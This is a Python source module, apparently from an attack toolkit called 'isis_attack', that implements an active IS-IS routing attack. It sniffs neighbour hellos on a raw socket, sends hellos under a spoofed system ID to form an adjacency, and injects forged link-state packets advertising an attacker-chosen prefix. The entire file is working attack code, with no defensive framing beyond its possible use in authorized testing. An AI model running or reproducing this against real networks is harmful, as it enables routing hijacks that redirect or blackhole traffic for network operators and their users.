"""Active ISIS adjacency engine — establish adjacency then inject poisoned LSPs."""
import socket
import struct
import threading
import time
from dataclasses import dataclass, field

from .auth import AUTH_NONE
from .neighbor import ISNeighborState
from isis_attack.network.adapter import get_local_mac


@dataclass
class SniffedISISParams:
    sys_id: str = ""
    area_addr: str = "49.0001"
    hello_interval: int = 10
    hold_timer: int = 30
    priority: int = 64


class ActiveISISEngine:
    def __init__(self, iface: str, spoofed_sys_id: str,
                 area_addr: str = "49.0001", level: int = 1,
                 auth_type: int = AUTH_NONE, auth_key: bytes = b""):
        self.iface = iface
        self.spoofed_sys_id = spoofed_sys_id
        self.area_addr = area_addr
        self.level = level
        self.auth_type = auth_type
        self.auth_key = auth_key
        self.params = None

        self.src_mac = get_local_mac(iface)

        self._state = ISNeighborState.DOWN
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._recv = None
        self._hello_pkt = None

        self.hello_sent = 0
        self.lsp_sent = 0
        self.log: list[str] = []

    @property
    def state(self) -> ISNeighborState:
        with self._lock:
            return self._state

    @state.setter
    def state(self, v: ISNeighborState):
        with self._lock:
            old = self._state
            self._state = v
        if old != v:
            self.log.append(f"[{old.name}->{v.name}]")

    def sniff(self, timeout: float = 15) -> bool:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        sock.bind((self.iface, 0))
        sock.settimeout(timeout)
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                data, _ = sock.recvfrom(65535)
                if len(data) < 30 or data[14] != 0xFE or data[15] != 0xFE or data[16] != 0x03:
                    continue
                isis = data[17:]
                pdu_type = isis[4] if len(isis) > 4 else 0
                if pdu_type not in (15, 16):
                    continue
                id_len = isis[3] if isis[3] != 0 else 6
                sid_bytes = isis[8:8 + id_len]
                sys_id = sid_bytes.hex()
                sys_id = ".".join(sys_id[i:i+4] for i in range(0, len(sys_id), 4))
                self.params = SniffedISISParams(sys_id=sys_id)
                sock.close()
                return True
            except socket.timeout:
                break
        sock.close()
        return self.params is not None

    def establish(self, timeout: float = 60) -> bool:
        if not self.params and not self.sniff():
            return False

        from isis_attack.core.packet import build_iih_packet
        self._hello_pkt = build_iih_packet(
            sys_id=self.spoofed_sys_id, area_addr=self.area_addr,
            src_mac=self.src_mac, level=self.level, priority=64, hold_timer=30,
        )

        self._hello_th = threading.Thread(target=self._run_hello, daemon=True)
        self._hello_th.start()
        self._sm_th = threading.Thread(target=self._run_state_machine, args=(time.time() + timeout,), daemon=True)
        self._sm_th.start()
        self._sm_th.join(timeout=timeout + 10)
        return self.state >= ISNeighborState.INIT

    def inject_lsp(self, metric: int = 10, network_addr: str = "10.99.0.0",
                   network_mask: str = "255.255.255.0") -> bool:
        from isis_attack.core.packet import build_lsp_with_tlvs
        from isis_attack.network.sender import PacketSender
        sender = PacketSender(iface=self.iface, packet_rate=10)
        pkt = build_lsp_with_tlvs(
            sys_id=self.spoofed_sys_id, lsp_id=f"{self.spoofed_sys_id}.00-00",
            src_mac=self.src_mac, level=self.level, sequence=1, remaining_lifetime=1200,
            metric=metric, network_addr=network_addr, network_mask=network_mask,
        )
        for _ in range(3):
            sender.send_l2(pkt)
        self.lsp_sent = 3
        return True

    def shutdown(self):
        self._stop.set()

    def _run_hello(self):
        from isis_attack.network.sender import PacketSender
        sender = PacketSender(iface=self.iface, packet_rate=100)
        interval = max(self.params.hello_interval if self.params else 10, 2)
        while not self._stop.is_set():
            try:
                sender.send_l2(self._hello_pkt)
                self.hello_sent += 1
            except Exception:
                pass
            self._stop.wait(interval)

    def _run_state_machine(self, deadline: float):
        try:
            self._recv = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            self._recv.bind((self.iface, 0))
            self._recv.settimeout(1)
            while time.time() < deadline and not self._stop.is_set():
                try:
                    raw_frame = self._recv.recv(65535)
                except socket.timeout:
                    continue
                if len(raw_frame) < 30:
                    continue
                if raw_frame[14] != 0xFE or raw_frame[15] != 0xFE or raw_frame[16] != 0x03:
                    continue
                isis = raw_frame[17:]
                pdu_type = isis[4] if len(isis) > 4 else 0
                if pdu_type in (15, 16):
                    if self.state < ISNeighborState.INIT:
                        self.state = ISNeighborState.INIT
                    self.state = ISNeighborState.UP
                    return
        finally:
            if self._recv is not None:
                try:
                    self._recv.close()
                except Exception:
                    pass
